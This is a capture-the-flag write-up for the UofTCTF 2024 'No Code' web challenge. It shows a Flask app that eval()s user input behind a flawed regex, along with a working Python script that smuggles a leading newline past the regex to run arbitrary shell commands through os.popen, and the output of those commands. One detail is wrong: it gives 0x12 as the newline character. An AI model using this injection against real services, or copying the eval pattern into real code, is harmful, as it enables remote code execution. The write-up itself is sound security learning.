---
title: "No Code"
description: "I made a web app that lets you run any code you want. Just kidding!"
pubDate: 2024-01-15
ctf: "UofTCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-uoftctf/icon.png"
---

Trying to visit the website returns a 'Not Found' error, so I decide to look at the source code first.

```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code', '')
    if re.match(".*[\x20-\x7E]+.*", code):
        return jsonify({"output": "jk lmao no code"}), 403
    result = ""
    try:
        result = eval(code)
    except Exception as e:
        result = str(e)

    return jsonify({"output": result}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=False)
```

The source code is incredibly short and has a regex for all printable characters... Let's see what we can do!

Looking at this [table](https://www.asciitable.com/) we can see we have access to some characters just before `0x20`, most interestingly `0x12` or a newline.

That means we can smuggle in python to evaluate from the regex by utilising a `\n` at the start of our payload, now how do we exfiltrate?

Funnily enough I found it quite challenging to get a good result out from `eval()` so I ended up making a script to try my possiblities. After alot of trial and error I found this to be a working payload:

```python
import requests,json
cmd=input('Commmand: ')
PL=f"\nstr(exec(\"import os; result=os.popen(\'{cmd}\').read();\"))+result"
r=requests.post(
    "https://uoftctf-no-code.chals.io/execute",
    data={"code": PL}
)
data=json.loads(r.content.decode())
print(data['output'][4:])
```

After probing with `ls` I find the flag in the current directory and run `cat flag.txt` to read the flag.

```
$ python3 exploit.py
Commmand: ls
app.py
flag.txt
requirements.txt
$ python3 exploit.py
Commmand: cat flag.txt
uoftctf{r3g3x_3p1c_f41L_XDDD}
```

And there it is!

Flag: `uoftctf{r3g3x_3p1c_f41L_XDDD}`

**Files:** [app.py](https://files.seall.dev/ctfs/uoftctf2024/no-code/app.py)